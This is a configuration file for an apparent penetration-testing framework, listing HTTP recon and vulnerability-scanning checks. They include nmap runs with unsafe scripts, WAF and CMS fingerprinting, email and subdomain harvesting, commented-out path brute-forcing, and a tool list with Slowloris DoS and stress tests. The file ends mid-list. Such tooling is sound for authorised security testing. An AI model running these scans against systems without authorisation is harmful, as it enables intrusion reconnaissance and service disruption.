#
# <service_name>.conf (one config file per service):
# --------------------------------------------------
# [config]
# default_port     = [0-65535] (mandatory)
# protocol         = tcp|udp (mandatory)
# categories       = list of categories for classifying checks ([a-z0-9_-]) (mandatory)
# auth_types       = list of authentication types, only for HTTP ([a-z0-9_-]) (optional)

# [specific_options] (optional)
# <option_name ([a-z0-9_-])> = boolean:default_value|list|var
#       (for boolean, default value can be added, True or False. False by default)

# [supported_list_options] (required if options of type list are present)
# For each option of type "list":
#   supported_<option_name> = list of supported values for the option ([a-z0-9_-])

# [products]Â (optional)
#   <product_type> ([a-z0-9_-]) = list of supported product names ([a-zA-Z0-9_\/-. ])
#   format: [vendor/]product_name (vendor can be omitted if no confusion)

# For each check:
#   [check_<check_name>]
#   name           = display name (mandatory) 
#   category       = category inside which this check is classified (mandatory)
#   description    = short text describing the check (mandatory)
#   tool           = tool_name of the tool to use
#   For each command (there must be at least one command):
#       command_<command_number> = command-line for the check, multiple tags supported
#       context_<command_number> = context that must be met to run the command (optional)
#

[config]
default_port = 80
protocol     = tcp
categories   = recon, vulnlookup, vulnscan, exploit, bruteforce, discovery, postexploit

auth_types   = 
    axis2,
    coldfusion,
    domino,
    drupal,
    glassfish, 
    htaccess,
    jboss, 
    jenkins, 
    joomla,
    magento,
    opencart,
    railo,
    tomcat, 
    weblogic, 
    websphere, 
    wordpress

[specific_options]
https       = boolean
webdav      = boolean
htaccess    = boolean
weblogic-t3 = boolean

[products]
web-language =
    Microsoft/ASP.NET,
    CFML,
    Go,
    Java,
    Lua,
    Node.js,
    Perl,
    PHP,
    Python,
    Ruby

web-application-firewall =
    aeSecure/aeSecure,
    Phion/Ergon/Airlock,
    Alert Logic/Alert Logic,
    Alibaba Cloud Computing/AliYunDun,
    Anquanbao/Anquanbao,
    AnYu Technologies/AnYu,
    Approach/Approach,
    Armor/Armor Defense,
    Microsoft/ASP.NET Generic Protection,
    Czar Securities/Astra Web Protection,
    Amazon/AWS Elastic Load Balancer,
    Baidu Cloud Computing/Yunjiasu,
    Ethic Ninja/Barikode,
    Barracuda Networks/Barracuda Application Firewall,
    Faydata Technologies Inc./Bekchy,
    BinarySec/BinarySec,
    BitNinja/BitNinja,
    BlockDoS/BlockDoS,
    Bluedon IST/Bluedon,
    Varnish/CacheWall,
    CdnNs/WdidcNet/CdnNS Application Gateway,
    Cerber Tech/WP Cerber Security,
    ChinaCache/ChinaCache CDN Load Balancer,
    Yunaq/Chuang Yu Shield,
    Cisco/ACE XML Gateway,
    Penta Security/Cloudbric,
    Cloudflare Inc./Cloudflare,
    Amazon/Cloudfront,
    Comodo CyberSecurity/Comodo cWatch,
    Jean-Denis Brun/CrawlProtect,
    Rohde & Schwarz CyberSecurity/DenyALL,
    Distil Networks/Distil,
    DOSarrest Internet Security/DOSarrest,
    Applicure Technologies/DotDefender,
    DynamicWeb/DynamicWeb Injection Check,
    Verizon Digital Media/Edgecast,
    EllisLab/Expression Engine,
    F5 Networks/BIG-IP Access Policy Manager,
    F5 Networks/BIG-IP Application Security Manager,
    F5 Networks/BIG-IP Local Traffic Manager,
    F5 Networks/FirePass,
    F5 Networks/Trafficshield,
    Fortinet/FortiWeb,
    GoDaddy/GoDaddy Website Protection,
    Grey Wizard/Greywizard,
    Art of Defense/HyperGuard,
    IBM/DataPower,
    CloudLinux/Imunify360,
    Imperva Inc./Incapsula,
    Instart Logic/Instart DX,
    Microsoft/ISA Server,
    Janusec/Janusec Application Gateway,
    Jiasule/Jiasule,
    KnownSec/KS-WAF,
    Akamai/Kona Site Defender,
    LiteSpeed Technologies/LiteSpeed Firewall,
    Inactiv/Malcare,
    Mission Control/Mission Control Application Shield,
    SpiderLabs/ModSecurity,
    NBS Systems/NAXSI,
    PentestIt/Nemesida,
    Barracuda Networks/NetContinuum,
    Citrix Systems/NetScaler AppFirewall,
    AdNovum/NevisProxy,
    NewDefend/Newdefend,
    NexusGuard/NexusGuard Firewall,
    NinTechNet/NinjaFirewall,
    NSFocus Global Inc./NSFocus,
    BlackBaud/OnMessage Shield,
    Palo Alto Networks/Palo Alto Next Gen Firewall,
    PerimeterX/PerimeterX,
    PowerCDN/PowerCDN,
    ArmorLogic/Profense,
    Radware/AppWall,
    Reblaze/Reblaze,
    RSJoomla!/RSFirewall,
    Microsoft/ASP.NET RequestValidationMode,
    Sabre/Sabre Firewall,
    Safe3/Safe3 Web Firewall,
    SafeDog/Safedog,
    Chaitin Tech./Safeline,
    SecuPress/SecuPress WordPress Security,
    United Security Providers/Secure Entry,
    BeyondTrust/eEye SecureIIS,
    Imperva Inc./SecureSphere,
    Neusoft/SEnginx,
    One Dollar Plugin/Shield Security,
    SiteGround/SiteGround,
    Sakura Inc./SiteGuard,
    TrueShield/Sitelock,
    Dell/SonicWall,
    Sophos/UTM Web Protection,
    Squarespace/Squarespace,
    StackPath/StackPath,
    Sucuri Inc./Sucuri CloudProxy,
    Tencent Technologies/Tencent Cloud Firewall,
    Citrix Systems/Teros,
    TransIP/TransIP Web Firewall,
    iFinity/DotNetNuke/URLMaster SecurityCheck,
    Microsoft/URLScan,
    OWASP/Varnish,
    VirusDie LLC/VirusDie,
    Wallarm Inc./Wallarm,
    WatchGuard Technologies/WatchGuard,
    WebARX Security Solutions/WebARX,
    AQTRONIX/WebKnight,
    IBM/WebSEAL,
    WebTotem/WebTotem,
    Feedjit/Wordfence,
    WTS/WTS-WAF,
    360 Technologies/360WangZhanBao,
    XLabs/XLabs Security WAF,
    Yundun/Yundun,
    Yunsuo/Yunsuo,
    Zenedge/Zenedge,
    Accenture/ZScaler,
    West263 Content Delivery Network,
    pkSecurity Intrusion Detection System,
    Xuanwudun,
    Open-Resty Lua Nginx WAF

web-framework =
    Bootstrap,
    Angular Material,
    CakePHP,
    Codeigniter,
    Django,
    Expressjs/Express,
    Google/Web Toolkit,
    Laravel,
    Ruby On Rails,
    Symfony,
    Yiiframework

web-jslib = 
    Angularjs,
    Backbone.js,
    ef.js,
    FancyBox,
    Handlebars,
    Jquery,
    Jquery UI,
    Lightbox,
    Modernizr,
    Moment.js,
    MooTools,
    Mustache.js,
    Prototype Javascript Framework,
    React,
    RequireJS,
    TweenMax,
    Underscore.js

web-cms =
    3dcart,
    Advanced Electron Forum,
    Afosto,
    Afterbuy,
    Ametys Cms,
    Apostrophe Cms,
    Arastta,
    AsciiDoc,
    Aspnetforum,
    Beehive Forum,
    Bigcommerce,
    Bigware Shop,
    Bizweb,
    Bolt,
    Browsercms,
    Bubble,
    Burning Board,
    Adobe/Business Catalyst,
    Ckan,
    Clientexec,
    Cloudcart,
    Colormeshop,
    Contao Cms,
    Contendio,
    Contensis Cms,
    Contentbox,
    Contentful,
    Cpg Dragonfly Cms,
    Cotonti Siena,
    Craft Cms,
    Danneo/Cms,
    Sitecore/Cms,
    Cms Made Simple,
    Cmsimple,
    Concrete5,
    Dedecms,
    Discourse,
    Discuz,
    Django Cms,
    Dokuwiki,
    Dotcms,
    Dotnetnuke,
    Domino,
    Drupal,
    E107,
    Episerver,
    Expressionengine,
    Ez Publish,
    Flarum,
    Flexcmp,
    Fluxbb,
    Fork Cms,
    Fudforum,
    Getsimple Cms,
    Ghost Cms,
    Gravcms,
    Hippo Cms,
    Hotaru Cms,
    Impresspages Cms,
    Indexhibit,
    Invision Power Board,
    Jalios Jcms,
    Jimdo,
    Jforum,
    Joomla,
    Koken,
    Kooboo Cms,
    Lepton-cms/Lepton,
    Liferay,
    Livejournal,
    Livestreet,
    Magento,
    Majordomo,
    Mambo,
    Squiz/Matrix,
    Mediawiki,
    Minibb,
    Mercuryboard,
    Modx Revolution,
    Moodle,
    Moto Cms,
    Movable Type,
    Mura Cms,
    Mvnforum,
    Mwforum,
    Mybb,
    Nodebb,
    NoNonsense Forum,
    October Cms,
    Odoo,
    Opencart,
    Opencms,
    Opentext Wsm,
    Ophal,
    Orchard,
    Pencilblue,
    Percussion Cms,
    Phorum,
    Php-nuke,
    Phpbb,
    Phpcms,
    Phpmyadmin,
    Phppgadmin,
    Phpwind,
    Pimcore,
    Plone,
    Presstopia,
    Prestashop,
    Punbb,
    Quick.cms,
    Rcms,
    Ritecms,
    Roadiz Cms,
    Rock Rms,
    Roundcube Webmail,
    Seamlesscms,
    Serendipity,
    Sharepoint,
    Silva,
    Silverstripe,
    Simple Machines Forum,
    Sitecore,
    Sitefinity,
    Snews,
    Solodev,
    Spin Cms,
    Squirrelmail,
    Subrion Cms,
    Sulu,
    Textpattern,
    Tiddlywiki,
    Tikiwiki,
    Typo3,
    UBB.threads,
    Uknowva,
    Ultimate Php Board,
    Ushahidi Platform,
    Umbraco,
    Umi Cms,
    Vanilla Forums,
    Vbulletin,
    Webflow Cms,
    Webgui,
    Websitebaker,
    Wolf Cms,
    Wordpress,
    Xenforo,
    Xmb,
    Xoops,
    Yabb,
    Yazd Discussion Forum,
    Yet Another Forum.net,
    Zen Cart,
    Zen Photos

web-server = 
    Apache,
    Hiawatha,
    IBM/HTTP Server,
    Lighttpd,
    LiteSpeed Web Server,
    Microsoft/IIS,
    Mongoose,
    Monkey Http Daemon,
    Nginx,
    Oracle/Http Server,
    Rejetto/Http File Server,
    Thttpd,
    Yaws,
    Zeus Web Server,

web-appserver = 
    Adobe/Coldfusion,
    Apache/Axis2,
    Apache/Tomcat,
    Eclipse/Jetty,
    Jboss,
    Jenkins,
    Oracle/Glassfish,
    Oracle/Weblogic Server,
    Railo,
    Websphere Application Server,
    Zope


#########################################################################################
# Recon
#########################################################################################
[check_nmap-simple-recon]
name        = nmap-simple-recon
category    = recon
description = Simple recon using Nmap
tool        = nmap
command_1   = sudo nmap -sT -sV -Pn -v -p [PORT] --stats-every 10s -d [IP]

[check_nmap-recon]
name        = nmap-recon
category    = recon
description = Recon using Nmap HTTP scripts
tool        = nmap
command_1   = sudo nmap -sT -sV -Pn -vv -p [PORT] --script-args=unsafe=1 --script='http-adobe-coldfusion-apsa1301,http-apache-negotiation,http-apache-server-status,http-aspnet-debug,http-auth-finder,http-axis2-dir-traversal,http-bigip-cookie,http-cakephp-version,http-coldfusion-subzero,http-comments-displayer,http-cookie-flags,http-cors,http-cross-domain-policy,http-errors,http-favicon,http-generator,http-git,http-iis-webdav-vuln,http-mcmp,http-methods,http-method-tamper,http-mobileversion-checker,http-ntlm-info,http-passwd,http-phpmyadmin-dir-traversal,http-phpself-xss,http-php-version,http-put,http-robots.txt,http-security-headers,http-server-header,http-shellshock,http-svn-enum,http-svn-info,http-title,http-trace,http-vuln*,http-webdav-scan,weblogic-t3-info' --script-args http.useragent='Mozilla/5.0 (Windows NT 6.1; WOW64; rv:64.0) Gecko/20100101 Firefox/64.0' --stats-every 10s -d [IP]

[check_waf-detection]
name        = waf-detection
category    = recon
description = Identify and fingerprint WAF products protecting website
tool        = wafw00f
command_1   = wafw00f -v -a [URL]

[check_waf-detection2]
name        = waf-detection2
category    = recon
description = Identify and fingerprint WAF products protecting website
tool        = identywaf
command_1   = python3 identYwaf.py [URL]

# [check_cloudmare-recon]
# name        = cloudmare-recon
# category    = recon
# description = Try to find real ip behind cloudflare
# tool        = Cloudmare
# context_1   = { 'web-application-firewall': 'Cloudflare Inc./Cloudflare'}
# command_1   = python3 Cloudmare.py -u [DOMAIN]

[check_fingerprinting-multi-whatweb]
name        = fingerprinting-multi-whatweb
category    = recon
description = Identify CMS, blogging platforms, JS libraries, Web servers
tool        = whatweb
command_1   = ./whatweb --user-agent 'Mozilla/5.0 (X11; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0' -a 3 -v [URL]

[check_fingerprinting-cms-cmseek]
name        = fingerprinting-cms-cmseek
category    = recon
description = Detect CMS (130+ supported), detect version on Drupal, advanced scan on Wordpress/Joomla
tool        = cmseek
command_1   = /bin/bash -c 'yes | python3 cmseek.py --clear-result; yes | python3 cmseek.py -v --user-agent "Mozilla/5.0 (X11; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0" -u [URL] > /tmp/cmseek.txt && tail -n +2 /tmp/cmseek.txt; cat Result/*/cms.json; rm /tmp/cmseek.txt'

# [check_fingerprinting-drupal]
# name        = fingerprinting-drupal
# category    = recon
# description = Fingerprint Drupal 7/8: users, nodes, default files, modules, themes enumeration
# tool        = drupwn
# command_1   = python3 drupwn --mode enum --target [URL]

# [check_crawling-fast]
# name        = crawling-fast
# category    = recon
# description = Crawl website quickly, analyze interesting files/directories
# tool        = dirhunt
# command_1   = python3 scripts/dirhunt [URL]

# [check_crawling-fast2]
# name        = crawling-fast2
# category    = recon
# description = Crawl website and extract URLs, files, intel & endpoints
# tool        = photon
# command_1   = python3 photon.py --url [URL] -o output; cd output; for f in `ls *.txt`; do echo; echo $f; echo "---------------------------------------------------"; cat $f | sed 's/\\n/\n/g'; echo; echo; done; cd ..; rm -rf output;

[check_gathering-emails]
name        = gathering-emails
category    = recon
description = Gather emails, subdomains, hosts, employee names, open ports, and banners from different public sources
tool        = theharvester
command_1   = theHarvester -d [DOMAIN] --shodan

#sublist3r
[check_gathering-subdomains]
name        = gathering-subdomains
category    = recon
description = Fast enumerate subdomains of websites using OSINT 
tool        = sublist3r
command_1   = python3 sublist3r.py -d [DOMAIN]

# [check_webdav-detection-msf]
# name        = webdav-detection-msf
# category    = recon
# description = Detect WebDAV on webserver
# tool        = metasploit
# command_1   = sudo msfconsole -q -x "use auxiliary/scanner/http/webdav_scanner; set RHOSTS [IP]; set RHOST [IP]; set RPORT [PORT]; set VERBOSE true; run; exit"


#########################################################################################
# Discovery
#########################################################################################
# [check_web-path-discovery-blind]
# name        = web-path-discovery-blind
# category    = discovery
# description = Bruteforce web paths when language is unknown (use raft wordlist)
# tool        = wfuzz
# command_1   = ./wfuzz -c -u '[URL]/FUZZ/' -w "[WORDLISTSDIR]/services/http/discovery/raft/raft-small-directories.txt" -t 30 --hc 400,404,405,406,429,500,502,503,504,000
# context_1   = { 'web-language': 'undefined' }
# command_2  = ./wfuzz -c -u '[URL]/FUZZ' -w "[WORDLISTSDIR]/services/http/discovery/raft/raft-small-files.txt" -t 30 --hc 400,404,405,406,429,500,502,503,504,000
# context_2   = { 'web-language': 'undefined' }

# [check_discovery-server]
# name        = discovery-server
# category    = discovery
# description = Bruteforce web paths specific to detected web/application servers
# tool        = dirsearch
# command_1   = dirsearch -u '[URL]' -e '' -w "[WORDLISTSDIR]/services/http/discovery/web-servers/Apache.txt" -t 50 --exclude-status=400,404,405,406,429,500,502,503,504,000 
# context_1   = { 'web-server': 'Apache' }
# command_2   = dirsearch -u '[URL]' -e '' -w "[WORDLISTSDIR]/services/http/discovery/web-servers/IIS.txt" -t 50 --exclude-status=400,404,405,406,429,500,502,503,504,000 --format plain -o out.txt; cat out.txt
# context_2   = { 'web-server': 'Microsoft/IIS' }
# command_3   = dirsearch -u '[URL]' -e '' -w "[WORDLISTSDIR]/services/http/discovery/web-servers/Nginx.txt" -t 50 --exclude-status=400,404,405,406,429,500,502,503,504,000 --format plain -o out.txt; cat out.txt
# context_3   = { 'web-server': 'Nginx' }
# command_4   = dirsearch -u '[URL]' -e '' -w "[WORDLISTSDIR]/services/http/discovery/app-servers/Axis.txt" -t 50 --exclude-status=400,404,405,406,429,500,502,503,504,000 --format plain -o out.txt; cat out.txt
# context_4   = { 'web-appserver': 'Apache/Axis2' }
# command_5   = dirsearch -u '[URL]' -e '' -w "[WORDLISTSDIR]/services/http/discovery/app-servers/Coldfusion.txt" -t 50 --exclude-status=400,404,405,406,429,500,502,503,504,000 --format plain -o out.txt; cat out.txt
# context_5   = { 'web-appserver': 'Adobe/Coldfusion' }
# command_6   = dirsearch -u '[URL]' -e '' -w "[WORDLISTSDIR]/services/http/discovery/app-servers/Glassfish.txt" -t 50 --exclude-status=400,404,405,406,429,500,502,503,504,000 --format plain -o out.txt; cat out.txt
# context_6   = { 'web-appserver': 'Oracle/Glassfish' }
# command_7   = dirsearch -u '[URL]' -e '' -w "[WORDLISTSDIR]/services/http/discovery/app-servers/Jboss.txt" -t 50 --exclude-status=400,404,405,406,429,500,502,503,504,000 --format plain -o out.txt; cat out.txt
# context_7   = { 'web-appserver': 'Jboss' }
# command_8   = dirsearch -u '[URL]' -e '' -w "[WORDLISTSDIR]/services/http/discovery/app-servers/Jenkins.txt" -t 50 --exclude-status=400,404,405,406,429,500,502,503,504,000 --format plain -o out.txt; cat out.txt
# context_8   = { 'web-appserver': 'Jenkins' }
# command_9   = dirsearch -u '[URL]' -e '' -w "[WORDLISTSDIR]/services/http/discovery/app-servers/Tomcat.txt" -t 50 --exclude-status=400,404,405,406,429,500,502,503,504,000 --format plain -o out.txt; cat out.txt
# context_9   = { 'web-appserver': 'Apache/Tomcat' }
# command_10  = dirsearch -u '[URL]' -e '' -w "[WORDLISTSDIR]/services/http/discovery/app-servers/Weblogic.txt" -t 50 --exclude-status=400,404,405,406,429,500,502,503,504,000 --format plain -o out.txt; cat out.txt
# context_10  = { 'web-appserver': 'Oracle/Weblogic Server' }
# command_11  = dirsearch -u '[URL]' -e '' -w "[WORDLISTSDIR]/services/http/discovery/app-servers/Websphere.txt" -t 50 --exclude-status=400,404,405,406,429,500,502,503,504,000 --format plain -o out.txt; cat out.txt
# context_11  = { 'web-appserver': 'Websphere Application Server' }

# [check_web-fuzzing-fast]
# name        = web-fuzzing-fast
# category    = discovery
# description = Fuzz web paths quickly 
# tool        = ffuf
# command_1   = ./ffuf -c -w "[WORDLISTSDIR]/services/http/discovery/raft/raft-small-directories.txt" -u '[URL]/FUZZ' -t 50 -o output.txt -of html


#########################################################################################
# Vulnscan
#########################################################################################
# tool_names = [
#                 #1
#                 ["host","Host - Checks for existence of IPV6 address.","host",1],

#                 #2
#                 ["aspnet_config_err","ASP.Net Misconfiguration - Checks for ASP.Net Misconfiguration.","wget",1],

#                 #3
#                 ["wp_check","WordPress Checker - Checks for WordPress Installation.","wget",1],

#                 #4
#                 ["drp_check", "Drupal Checker - Checks for Drupal Installation.","wget",1],

#                 #5
#                 ["joom_check", "Joomla Checker - Checks for Joomla Installation.","wget",1],

#                 #6
#                 ["uniscan","Uniscan - Checks for robots.txt & sitemap.xml","uniscan",1],

#                 #7
#                 ["wafw00f","Wafw00f - Checks for Application Firewalls.","wafw00f",1],

#                 #8
#                 ["nmap","Nmap - Fast Scan [Only Few Port Checks]","nmap",1],

#                 #9
#                 ["theHarvester","The Harvester - Scans for emails using Google's passive search.","theHarvester",1],

#                 #10
#                 ["dnsrecon","DNSRecon - Attempts Multiple Zone Transfers on Nameservers.","dnsrecon",1],

#                 #11
#                 #["fierce","Fierce - Attempts Zone Transfer [No Brute Forcing]","fierce",1],

#                 #12
#                 ["dnswalk","DNSWalk - Attempts Zone Transfer.","dnswalk",1],

#                 #13
#                 ["whois","WHOis - Checks for Administrator's Contact Information.","whois",1],

#                 #14
#                 ["nmap_header","Nmap [XSS Filter Check] - Checks if XSS Protection Header is present.","nmap",1],

#                 #15
#                 ["nmap_sloris","Nmap [Slowloris DoS] - Checks for Slowloris Denial of Service Vulnerability.","nmap",1],

#                 #16
#                 ["sslyze_hbleed","SSLyze - Checks only for Heartbleed Vulnerability.","sslyze",1],

#                 #17
#                 ["nmap_hbleed","Nmap [Heartbleed] - Checks only for Heartbleed Vulnerability.","nmap",1],

#                 #18
#                 ["nmap_poodle","Nmap [POODLE] - Checks only for Poodle Vulnerability.","nmap",1],

#                 #19
#                 ["nmap_ccs","Nmap [OpenSSL CCS Injection] - Checks only for CCS Injection.","nmap",1],

#                 #20
#                 ["nmap_freak","Nmap [FREAK] - Checks only for FREAK Vulnerability.","nmap",1],

#                 #21
#                 ["nmap_logjam","Nmap [LOGJAM] - Checks for LOGJAM Vulnerability.","nmap",1],

#                 #22
#                 ["sslyze_ocsp","SSLyze - Checks for OCSP Stapling.","sslyze",1],

#                 #23
#                 ["sslyze_zlib","SSLyze - Checks for ZLib Deflate Compression.","sslyze",1],

#                 #24
#                 ["sslyze_reneg","SSLyze - Checks for Secure Renegotiation Support and Client Renegotiation.","sslyze",1],

#                 #25
#                 ["sslyze_resum","SSLyze - Checks for Session Resumption Support with [Session IDs/TLS Tickets].","sslyze",1],

#                 #26
#                 ["lbd","LBD - Checks for DNS/HTTP Load Balancers.","lbd",1],

#                 #27
#                 ["golismero_dns_malware","Golismero - Checks if the domain is spoofed or hijacked.","golismero",1],

#                 #28
#                 ["golismero_heartbleed","Golismero - Checks only for Heartbleed Vulnerability.","golismero",1],

#                 #29
#                 ["golismero_brute_url_predictables","Golismero - BruteForces for certain files on the Domain.","golismero",1],

#                 #30
#                 ["golismero_brute_directories","Golismero - BruteForces for certain directories on the Domain.","golismero",1],

#                 #31
#                 ["golismero_sqlmap","Golismero - SQLMap [Retrieves only the DB Banner]","golismero",1],

#                 #32
#                 ["dirb","DirB - Brutes the target for Open Directories.","dirb",1],

#                 #33
#                 ["xsser","XSSer - Checks for Cross-Site Scripting [XSS] Attacks.","xsser",1],

#                 #34
#                 ["golismero_ssl_scan","Golismero SSL Scans - Performs SSL related Scans.","golismero",1],

#                 #35
#                 ["golismero_zone_transfer","Golismero Zone Transfer - Attempts Zone Transfer.","golismero",1],

#                 #36
#                 ["golismero_nikto","Golismero Nikto Scans - Uses Nikto Plugin to detect vulnerabilities.","golismero",1],

#                 #37
#                 ["golismero_brute_subdomains","Golismero Subdomains Bruter - Brute Forces Subdomain Discovery.","golismero",1],

#                 #38
#                 ["dnsenum_zone_transfer","DNSEnum - Attempts Zone Transfer.","dnsenum",1],

#                 #39
#                 ["fierce_brute_subdomains","Fierce Subdomains Bruter - Brute Forces Subdomain Discovery.","fierce",1],

#                 #40
#                 ["dmitry_email","DMitry - Passively Harvests Emails from the Domain.","dmitry",1],

#                 #41
#                 ["dmitry_subdomains","DMitry - Passively Harvests Subdomains from the Domain.","dmitry",1],

#                 #42
#                 ["nmap_telnet","Nmap [TELNET] - Checks if TELNET service is running.","nmap",1],

#                 #43
#                 ["nmap_ftp","Nmap [FTP] - Checks if FTP service is running.","nmap",1],

#                 #44
#                 ["nmap_stuxnet","Nmap [STUXNET] - Checks if the host is affected by STUXNET Worm.","nmap",1],

#                 #45
#                 ["webdav","WebDAV - Checks if WEBDAV enabled on Home directory.","davtest",1],

#                 #46
#                 ["golismero_finger","Golismero - Does a fingerprint on the Domain.","golismero",1],

#                 #47
#                 ["uniscan_filebrute","Uniscan - Brutes for Filenames on the Domain.","uniscan",1],

#                 #48
#                 ["uniscan_dirbrute", "Uniscan - Brutes Directories on the Domain.","uniscan",1],

#                 #49
#                 ["uniscan_ministresser", "Uniscan - Stress Tests the Domain.","uniscan",1],

#                 #50
#                 ["uniscan_rfi","Uniscan - Checks for LFI, RFI and RCE.","uniscan",1],

#                 #51
#                 ["uniscan_xss","Uniscan - Checks for XSS, SQLi, BSQLi & Other Checks.","uniscan",1],

#                 #52
#                 ["nikto_xss","Nikto - Checks for Apache Expect XSS Header.","nikto",1],

#                 #53
#                 ["nikto_subrute","Nikto - Brutes Subdomains.","nikto",1],

#                 #54
#                 ["nikto_shellshock","Nikto - Checks for Shellshock Bug.","nikto",1],

#                 #55
#                 ["nikto_internalip","Nikto - Checks for Internal IP Leak.","nikto",1],

#                 #56
#                 ["nikto_putdel","Nikto - Checks for HTTP PUT DEL.","nikto",1],

#                 #57
#                 ["nikto_headers","Nikto - Checks the Domain Headers.","nikto",1],

#                 #58
#                 ["nikto_ms01070","Nikto - Checks for MS10-070 Vulnerability.","nikto",1],

#                 #59
#                 ["nikto_servermsgs","Nikto - Checks for Server Issues.","nikto",1],

#                 #60
#                 ["nikto_outdated","Nikto - Checks if Server is Outdated.","nikto",1],

#                 #61
#                 ["nikto_httpoptions","Nikto - Checks for HTTP Options on the Domain.","nikto",1],

#                 #62
#                 ["nikto_cgi","Nikto - Enumerates CGI Directories.","nikto",1],

#                 #63
#                 ["nikto_ssl","Nikto - Performs SSL Checks.","nikto",1],

#                 #64
#                 ["nikto_sitefiles","Nikto - Checks for any interesting files on the Domain.","nikto",1],

#                 #65
#                 ["nikto_paths","Nikto - Checks for Injectable Paths.","nikto",1],

#                 #66
#                 ["dnsmap_brute","DNSMap - Brutes Subdomains.","dnsmap",1],

#                 #67
#                 ["nmap_sqlserver","Nmap - Checks for MS-SQL Server DB","nmap",1],

#                 #68
#                 ["nmap_mysql", "Nmap - Checks for MySQL DB","nmap",1],

#                 #69
#                 ["nmap_oracle", "Nmap - Checks for ORACLE DB","nmap",1],

#                 #70
#                 ["nmap_rdp_udp","Nmap - Checks for Remote Desktop Service over UDP","nmap",1],

#                 #71
#                 ["nmap_rdp_tcp","Nmap - Checks for Remote Desktop Service over TCP","nmap",1],

#                 #72
#                 ["nmap_full_ps_tcp","Nmap - Performs a Full TCP Port Scan","nmap",1],

#                 #73
#                 ["nmap_full_ps_udp","Nmap - Performs a Full UDP Port Scan","nmap",1],

#                 #74
#                 ["nmap_snmp","Nmap - Checks for SNMP Service","nmap",1],

#                 #75
#                 ["aspnet_elmah_axd","Checks for ASP.net Elmah Logger","wget",1],

#                 #76
#                 ["nmap_tcp_smb","Checks for SMB Service over TCP","nmap",1],

#                 #77
#                 ["nmap_udp_smb","Checks for SMB Service over UDP","nmap",1],

#                 #78
#                 ["wapiti","Wapiti - Checks for SQLi, RCE, XSS and Other Vulnerabilities","wapiti",1],

#                 #79
#                 ["nmap_iis","Nmap - Checks for IIS WebDAV","nmap",1],

#                 #80
#                 ["whatweb","WhatWeb - Checks for X-XSS Protection Header","whatweb",1],

#                 #81
#                 ["amass","AMass - Brutes Domain for Subdomains","amass",1]
#             ]

# tool_cmd   = [
#                 #1
#                 ["host ",""],

#                 #2
#                 ["wget -O /tmp/rapidscan_temp_aspnet_config_err --tries=1 ","/%7C~.aspx"],

#                 #3
#                 ["wget -O /tmp/rapidscan_temp_wp_check --tries=1 ","/wp-admin"],

#                 #4
#                 ["wget -O /tmp/rapidscan_temp_drp_check --tries=1 ","/user"],

#                 #5
#                 ["wget -O /tmp/rapidscan_temp_joom_check --tries=1 ","/administrator"],

#                 #6
#                 ["uniscan -e -u ",""],

#                 #7
#                 ["wafw00f ",""],

#                 #8
#                 ["nmap -F --open -Pn ",""],

#                 #9
#                 ["theHarvester -l 50 -b censys -d ",""],

#                 #10
#                 ["dnsrecon -d ",""],

#                 #11
#                 #["fierce -wordlist xxx -dns ",""],

#                 #12
#                 ["dnswalk -d ","."],

#                 #13
#                 ["whois ",""],

#                 #14
#                 ["nmap -p80 --script http-security-headers -Pn ",""],

#                 #15
#                 ["nmap -p80,443 --script http-slowloris --max-parallelism 500 -Pn ",""],

#                 #16
#                 ["sslyze --heartbleed ",""],

#                 #17
#                 ["nmap -p443 --script ssl-heartbleed -Pn ",""],

#                 #18
#                 ["nmap -p443 --script ssl-poodle -Pn ",""],

#                 #19
#                 ["nmap -p443 --script ssl-ccs-injection -Pn ",""],

#                 #20
#                 ["nmap -p443 --script ssl-enum-ciphers -Pn ",""],

#                 #21
#                 ["nmap -p443 --script ssl-dh-params -Pn ",""],

#                 #22
#                 ["sslyze --certinfo=basic ",""],

#                 #23
#                 ["sslyze --compression ",""],

#                 #24
#                 ["sslyze --reneg ",""],

#                 #25
#                 ["sslyze --resum ",""],

#                 #26
#                 ["lbd ",""],

#                 #27
#                 ["golismero -e dns_malware scan ",""],

#                 #28
#                 ["golismero -e heartbleed scan ",""],

#                 #29
#                 ["golismero -e brute_url_predictables scan ",""],

#                 #30
#                 ["golismero -e brute_directories scan ",""],

#                 #31
#                 ["golismero -e sqlmap scan ",""],

#                 #32
#                 ["dirb http://"," -fi"],

#                 #33
#                 ["xsser --all=http://",""],

#                 #34
#                 ["golismero -e sslscan scan ",""],

#                 #35
#                 ["golismero -e zone_transfer scan ",""],

#                 #36
#                 ["golismero -e nikto scan ",""],

#                 #37
#                 ["golismero -e brute_dns scan ",""],

#                 #38
#                 ["dnsenum ",""],

#                 #39
#                 ["fierce --domain ",""],

#                 #40
#                 ["dmitry -e ",""],

#                 #41
#                 ["dmitry -s ",""],

#                 #42
#                 ["nmap -p23 --open -Pn ",""],

#                 #43
#                 ["nmap -p21 --open -Pn ",""],

#                 #44
#                 ["nmap --script stuxnet-detect -p445 -Pn ",""],

#                 #45
#                 ["davtest -url http://",""],

#                 #46
#                 ["golismero -e fingerprint_web scan ",""],

#                 #47
#                 ["uniscan -w -u ",""],

#                 #48
#                 ["uniscan -q -u ",""],

#                 #49
#                 ["uniscan -r -u ",""],

#                 #50
#                 ["uniscan -s -u ",""],

#                 #51
#                 ["uniscan -d -u ",""],

#                 #52
#                 ["nikto -Plugins 'apache_expect_xss' -host ",""],

#                 #53
#                 ["nikto -Plugins 'subdomain' -host ",""],

#                 #54
#                 ["nikto -Plugins 'shellshock' -host ",""],

#                 #55
#                 ["nikto -Plugins 'cookies' -host ",""],

#                 #56
#                 ["nikto -Plugins 'put_del_test' -host ",""],

#                 #57
#                 ["nikto -Plugins 'headers' -host ",""],

#                 #58
#                 ["nikto -Plugins 'ms10-070' -host ",""],

#                 #59
#                 ["nikto -Plugins 'msgs' -host ",""],

#                 #60
#                 ["nikto -Plugins 'outdated' -host ",""],

#                 #61
#                 ["nikto -Plugins 'httpoptions' -host ",""],

#                 #62
#                 ["nikto -Plugins 'cgi' -host ",""],

#                 #63
#                 ["nikto -Plugins 'ssl' -host ",""],

#                 #64
#                 ["nikto -Plugins 'sitefiles' -host ",""],

#                 #65
#                 ["nikto -Plugins 'paths' -host ",""],

#                 #66
#                 ["dnsmap ",""],

#                 #67
#                 ["nmap -p1433 --open -Pn ",""],

#                 #68
#                 ["nmap -p3306 --open -Pn ",""],

#                 #69
#                 ["nmap -p1521 --open -Pn ",""],

#                 #70
#                 ["nmap -p3389 --open -sU -Pn ",""],

#                 #71
